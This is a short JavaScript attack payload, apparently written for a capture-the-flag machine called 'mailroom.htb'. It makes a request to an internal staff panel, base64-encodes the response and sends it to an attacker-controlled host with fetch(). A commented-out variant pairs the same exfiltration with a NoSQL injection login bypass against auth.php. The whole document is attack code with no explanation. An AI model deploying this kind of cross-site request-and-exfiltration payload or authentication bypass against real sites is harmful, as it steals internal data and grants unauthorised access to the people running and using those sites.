var http = new XMLHttpRequest();
http.open('POST', "http://staff-review-panel.mailroom.htb/index.php", true);
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.onload = function () {
    fetch("http://<IP>/out?" + encodeURI(btoa(this.responseText)));
};
http.send(null);

// var http = new XMLHttpRequest();
// http.open('POST', "http://staff-review-panel.mailroom.htb/auth.php", true);
// http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
// http.onload = function () {
//     fetch("http://<IP>/out?" + encodeURI(btoa(this.responseText)));
// };
// // http.send(null);
// http.send("email[$ne]=yu8@yu8.yu8&password[$ne]=yu8");